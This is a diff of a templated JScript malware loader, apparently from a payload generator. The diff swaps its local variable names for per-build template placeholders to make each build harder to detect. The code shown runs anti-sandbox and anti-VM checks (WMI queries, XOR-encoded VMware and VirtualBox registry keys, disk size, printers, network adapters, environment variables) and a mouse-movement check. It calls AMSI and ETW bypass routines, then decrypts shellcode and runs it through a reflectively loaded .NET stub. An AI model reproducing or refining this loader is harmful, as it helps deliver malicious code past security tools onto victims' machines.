@@ -28,56 +28,56 @@ function {{ v.fn_etw }}() {
 
 function {{ v.fn_sandbox }}() {
     try {
-        var wmi = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
-        var pq = wmi.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_proc_q }}]));
-        var bad = {{ v.fn_build_str }}([{{ v.jsc_vm_procs }}]).split("|");
-        for (var e = new Enumerator(pq); !e.atEnd(); e.moveNext()) {
-            var n = e.item().Name.toLowerCase();
-            for (var i = 0; i < bad.length; i++) { if (n === bad[i]) return true; }
+        var {{ v.jsc_lv_wmi }} = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
+        var {{ v.jsc_lv_pq }}  = {{ v.jsc_lv_wmi }}.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_proc_q }}]));
+        var {{ v.jsc_lv_bad }} = {{ v.fn_build_str }}([{{ v.jsc_vm_procs }}]).split("|");
+        for (var {{ v.jsc_lv_e }} = new Enumerator({{ v.jsc_lv_pq }}); !{{ v.jsc_lv_e }}.atEnd(); {{ v.jsc_lv_e }}.moveNext()) {
+            var {{ v.jsc_lv_n }} = {{ v.jsc_lv_e }}.item().Name.toLowerCase();
+            for (var i = 0; i < {{ v.jsc_lv_bad }}.length; i++) { if ({{ v.jsc_lv_n }} === {{ v.jsc_lv_bad }}[i]) return true; }
         }
-        var mq = wmi.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_monitor_q }}]));
-        for (var e2 = new Enumerator(mq); !e2.atEnd(); e2.moveNext()) {
-            var d = e2.item();
-            if (d.ScreenWidth && d.ScreenWidth < 800) return true;
+        var {{ v.jsc_lv_mq }} = {{ v.jsc_lv_wmi }}.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_monitor_q }}]));
+        for (var {{ v.jsc_lv_em }} = new Enumerator({{ v.jsc_lv_mq }}); !{{ v.jsc_lv_em }}.atEnd(); {{ v.jsc_lv_em }}.moveNext()) {
+            var {{ v.jsc_lv_d }} = {{ v.jsc_lv_em }}.item();
+            if ({{ v.jsc_lv_d }}.ScreenWidth && {{ v.jsc_lv_d }}.ScreenWidth < 800) return true;
         }
-    } catch(e2) {}
+    } catch(e) {}
     try {
-        var sh = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
-        var _vmr=[{{ jsc_vmware_reg_enc }}],_vmx={{ jsc_vmware_reg_xk }};
-        for(var _ri=0;_ri<_vmr.length;_ri++)_vmr[_ri]^=_vmx;
-        sh.RegRead({{ v.fn_build_str }}(_vmr));
+        var {{ v.jsc_lv_sh }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
+        var {{ v.jsc_lv_vmr }}=[{{ jsc_vmware_reg_enc }}],{{ v.jsc_lv_vmx }}={{ jsc_vmware_reg_xk }};
+        for(var {{ v.jsc_lv_ri }}=0;{{ v.jsc_lv_ri }}<{{ v.jsc_lv_vmr }}.length;{{ v.jsc_lv_ri }}++){{ v.jsc_lv_vmr }}[{{ v.jsc_lv_ri }}]^={{ v.jsc_lv_vmx }};
+        {{ v.jsc_lv_sh }}.RegRead({{ v.fn_build_str }}({{ v.jsc_lv_vmr }}));
         return true;
     } catch(e) {}
     try {
-        var sh2 = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
-        var _vbr=[{{ jsc_vbox_reg_enc }}],_vbx={{ jsc_vbox_reg_xk }};
-        for(var _ri2=0;_ri2<_vbr.length;_ri2++)_vbr[_ri2]^=_vbx;
-        sh2.RegRead({{ v.fn_build_str }}(_vbr));
+        var {{ v.jsc_lv_sh2 }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
+        var {{ v.jsc_lv_vbr }}=[{{ jsc_vbox_reg_enc }}],{{ v.jsc_lv_vbx }}={{ jsc_vbox_reg_xk }};
+        for(var {{ v.jsc_lv_ri2 }}=0;{{ v.jsc_lv_ri2 }}<{{ v.jsc_lv_vbr }}.length;{{ v.jsc_lv_ri2 }}++){{ v.jsc_lv_vbr }}[{{ v.jsc_lv_ri2 }}]^={{ v.jsc_lv_vbx }};
+        {{ v.jsc_lv_sh2 }}.RegRead({{ v.fn_build_str }}({{ v.jsc_lv_vbr }}));
         return true;
     } catch(e) {}
     try {
-        var fso = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_fs_obj }}]));
-        var drv = fso.GetDrive("C:");
-        if (drv.TotalSize < 53687091200) return true;
+        var {{ v.jsc_lv_fso }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_fs_obj }}]));
+        var {{ v.jsc_lv_drv }} = {{ v.jsc_lv_fso }}.GetDrive("C:");
+        if ({{ v.jsc_lv_drv }}.TotalSize < 53687091200) return true;
     } catch(e) {}
     try {
-        var wmi2 = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
-        var prq = wmi2.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_printer_q }}]));
-        var pc = 0;
-        for (var ep = new Enumerator(prq); !ep.atEnd(); ep.moveNext()) pc++;
-        if (pc === 0) return true;
+        var {{ v.jsc_lv_wmi2 }} = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
+        var {{ v.jsc_lv_prq }} = {{ v.jsc_lv_wmi2 }}.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_printer_q }}]));
+        var {{ v.jsc_lv_pc }} = 0;
+        for (var {{ v.jsc_lv_ep2 }} = new Enumerator({{ v.jsc_lv_prq }}); !{{ v.jsc_lv_ep2 }}.atEnd(); {{ v.jsc_lv_ep2 }}.moveNext()) {{ v.jsc_lv_pc }}++;
+        if ({{ v.jsc_lv_pc }} === 0) return true;
     } catch(e) {}
     try {
-        var wmi3 = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
-        var naq = wmi3.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_mac_q }}]));
-        var nac = 0;
-        for (var ena = new Enumerator(naq); !ena.atEnd(); ena.moveNext()) nac++;
-        if (nac < 2) return true;
+        var {{ v.jsc_lv_wmi3 }} = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
+        var {{ v.jsc_lv_naq }} = {{ v.jsc_lv_wmi3 }}.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_mac_q }}]));
+        var {{ v.jsc_lv_nac }} = 0;
+        for (var {{ v.jsc_lv_ena }} = new Enumerator({{ v.jsc_lv_naq }}); !{{ v.jsc_lv_ena }}.atEnd(); {{ v.jsc_lv_ena }}.moveNext()) {{ v.jsc_lv_nac }}++;
+        if ({{ v.jsc_lv_nac }} < 2) return true;
     } catch(e) {}
     try {
-        var _env = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}])).Environment("Process");
-        if (_env({{ v.fn_build_str }}([{{ v.jsc_env_vbox }}])) !== "") return true;
-        if (_env({{ v.fn_build_str }}([{{ v.jsc_env_sandboxie }}])) !== "") return true;
+        var {{ v.jsc_lv_envobj }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}])).Environment("Process");
+        if ({{ v.jsc_lv_envobj }}({{ v.fn_build_str }}([{{ v.jsc_env_vbox }}])) !== "") return true;
+        if ({{ v.jsc_lv_envobj }}({{ v.fn_build_str }}([{{ v.jsc_env_sandboxie }}])) !== "") return true;
     } catch(e) {}
     return false;
 }
@@ -99,33 +99,33 @@ function {{ v.fn_decrypt }}(d, k) {
 
 function {{ v.fn_exec }}() {
     if ({{ v.fn_sandbox }}()) { WScript.Quit(0); }
-    var _cx = -999, _cy = -999;
+    var {{ v.jsc_lv_cx }} = -999, {{ v.jsc_lv_cy }} = -999;
     try {
-        var _a=new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}])),_w=_a.LoadWithPartialName({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms }}]));
-        if(_w){var _t=_w.GetType({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms_cur }}]));
-        if(_t){var _pp=_t.GetProperty({{ v.fn_build_str }}([{{ v.jsc_cursor_position }}]),24);
-        if(_pp){var _ps=_pp.GetValue(null,null);if(_ps){_cx=_ps.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue(_ps,null);_cy=_ps.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue(_ps,null);}}}}
+        var {{ v.jsc_lv_a1 }}=new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}])),{{ v.jsc_lv_w1 }}={{ v.jsc_lv_a1 }}.LoadWithPartialName({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms }}]));
+        if({{ v.jsc_lv_w1 }}){var {{ v.jsc_lv_t1 }}={{ v.jsc_lv_w1 }}.GetType({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms_cur }}]));
+        if({{ v.jsc_lv_t1 }}){var {{ v.jsc_lv_pp1 }}={{ v.jsc_lv_t1 }}.GetProperty({{ v.fn_build_str }}([{{ v.jsc_cursor_position }}]),24);
+        if({{ v.jsc_lv_pp1 }}){var {{ v.jsc_lv_ps1 }}={{ v.jsc_lv_pp1 }}.GetValue(null,null);if({{ v.jsc_lv_ps1 }}){ {{ v.jsc_lv_cx }}={{ v.jsc_lv_ps1 }}.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue({{ v.jsc_lv_ps1 }},null);{{ v.jsc_lv_cy }}={{ v.jsc_lv_ps1 }}.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue({{ v.jsc_lv_ps1 }},null);}}}}
     } catch(e) {}
     WScript.Sleep(2000 + Math.floor(Math.random() * 3000));
-    if (_cx !== -999) {
+    if ({{ v.jsc_lv_cx }} !== -999) {
         try {
-            var _a2=new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}])),_w2=_a2.LoadWithPartialName({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms }}]));
-            if(_w2){var _t2=_w2.GetType({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms_cur }}]));
-            if(_t2){var _pp2=_t2.GetProperty({{ v.fn_build_str }}([{{ v.jsc_cursor_position }}]),24);
-            if(_pp2){var _ps2=_pp2.GetValue(null,null);if(_ps2){var _cx2=_ps2.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue(_ps2,null);var _cy2=_ps2.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue(_ps2,null);if(_cx===_cx2&&_cy===_cy2)WScript.Quit(0);}}}}
+            var {{ v.jsc_lv_a2 }}=new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}])),{{ v.jsc_lv_w2 }}={{ v.jsc_lv_a2 }}.LoadWithPartialName({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms }}]));
+            if({{ v.jsc_lv_w2 }}){var {{ v.jsc_lv_t2 }}={{ v.jsc_lv_w2 }}.GetType({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms_cur }}]));
+            if({{ v.jsc_lv_t2 }}){var {{ v.jsc_lv_pp2 }}={{ v.jsc_lv_t2 }}.GetProperty({{ v.fn_build_str }}([{{ v.jsc_cursor_position }}]),24);
+            if({{ v.jsc_lv_pp2 }}){var {{ v.jsc_lv_ps2 }}={{ v.jsc_lv_pp2 }}.GetValue(null,null);if({{ v.jsc_lv_ps2 }}){var {{ v.jsc_lv_cx2 }}={{ v.jsc_lv_ps2 }}.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue({{ v.jsc_lv_ps2 }},null);var {{ v.jsc_lv_cy2 }}={{ v.jsc_lv_ps2 }}.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue({{ v.jsc_lv_ps2 }},null);if({{ v.jsc_lv_cx }}==={{ v.jsc_lv_cx2 }}&&{{ v.jsc_lv_cy }}==={{ v.jsc_lv_cy2 }})WScript.Quit(0);}}}}
         } catch(e2) {}
     }
     {{ v.fn_amsi }}();
     {{ v.fn_etw }}();
-    var _k = {{ v.fn_hex2arr }}({{ v.var_key }});
-    for (var _ki = 0; _ki < _k.length; _ki++) _k[_ki] ^= {{ key_tweak }};
-    var sc  = {{ v.fn_decrypt }}({{ v.fn_hex2arr }}({{ v.var_sc }}), _k);
-    var loader = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
-    var stub   = {{ v.fn_hex2arr }}("{{ dotnet_stub_hex }}");
-    var asm    = loader.Load(stub);
-    var t      = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_stub_loader }}]));
-    var mi     = t.GetMethod({{ v.fn_build_str }}([{{ v.jsc_stub_run }}]));
-    mi.Invoke(null, [sc]);
+    var {{ v.jsc_lv_k }} = {{ v.fn_hex2arr }}({{ v.var_key }});
+    for (var {{ v.jsc_lv_ki }} = 0; {{ v.jsc_lv_ki }} < {{ v.jsc_lv_k }}.length; {{ v.jsc_lv_ki }}++) {{ v.jsc_lv_k }}[{{ v.jsc_lv_ki }}] ^= {{ key_tweak }};
+    var {{ v.jsc_lv_sc }}  = {{ v.fn_decrypt }}({{ v.fn_hex2arr }}({{ v.var_sc }}), {{ v.jsc_lv_k }});
+    var {{ v.jsc_lv_loader }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
+    var {{ v.jsc_lv_stub }}   = {{ v.fn_hex2arr }}("{{ dotnet_stub_hex }}");
+    var {{ v.jsc_lv_asm }}    = {{ v.jsc_lv_loader }}.Load({{ v.jsc_lv_stub }});
+    var {{ v.jsc_lv_t1 }}     = {{ v.jsc_lv_asm }}.GetType({{ v.fn_build_str }}([{{ v.jsc_stub_loader }}]));
+    var {{ v.jsc_lv_mi }}     = {{ v.jsc_lv_t1 }}.GetMethod({{ v.fn_build_str }}([{{ v.jsc_stub_run }}]));
+    {{ v.jsc_lv_mi }}.Invoke(null, [{{ v.jsc_lv_sc }}]);
 }
 
 {{ v.fn_exec }}();
